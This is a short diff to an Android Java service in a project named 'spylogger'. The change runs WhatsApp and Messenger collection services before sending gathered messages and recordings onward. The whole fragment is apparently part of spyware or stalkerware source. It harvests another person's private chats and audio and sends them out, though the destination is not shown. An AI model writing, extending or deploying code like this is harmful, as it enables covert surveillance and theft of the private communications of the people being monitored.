@@ -5,6 +5,7 @@ import android.os.Message;
 import android.util.Log;
 
 import com.gravatasufoca.spylogger.dao.DatabaseHelper;
+import com.gravatasufoca.spylogger.helpers.MensageiroAsyncHelper;
 import com.gravatasufoca.spylogger.helpers.NetworkUtil;
 import com.gravatasufoca.spylogger.helpers.ServicosHelper;
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
@@ -215,12 +216,16 @@ public class FcmHelperService {
            reativarMensagens();
         }
 
-        SendMensagensService sendMensagensService=new SendMensagensService(context,null);
-        sendMensagensService.enviarTopicos();
+        new MensageiroAsyncHelper(context, new TaskComplete() {
+            @Override
+            public void onFinish(Object object) {
+                SendMensagensService sendMensagensService=new SendMensagensService(context,null);
+                sendMensagensService.enviarTopicos();
 
-        SendGravacoesService sendGravacoesService=new SendGravacoesService(context,null);
-        sendGravacoesService.enviarTopicos();
-
+                SendGravacoesService sendGravacoesService=new SendGravacoesService(context,null);
+                sendGravacoesService.enviarTopicos();
+            }
+        }).execute(new WhatsAppService(context),new MessengerService(context));
     }
 
     private void reenviarArquivos(List<Integer> ids){
